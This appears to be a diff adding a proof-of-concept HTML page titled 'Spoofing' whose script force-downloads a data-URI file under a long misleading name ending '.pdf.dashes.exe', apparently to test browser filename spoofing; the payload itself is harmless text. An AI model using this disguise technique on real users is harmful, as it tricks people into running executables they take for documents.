@@ -1,0 +1,19 @@
+<script language="javascript">
+function Puf(uri, name) {
+  var link = document.createElement("a");
+  link.download = name;
+  link.href = uri;
+  link.click();
+  
+}
+function openWin()
+{
+
+
+Puf("data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=", "long-extended-subdomain-name-containing-many-letters.pdf.dashes.exe")
+}
+
+</script>
+<center><h2>Spoofing</h2></center>
+
+<input type="button"  onclick="openWin();" value="open"/>	
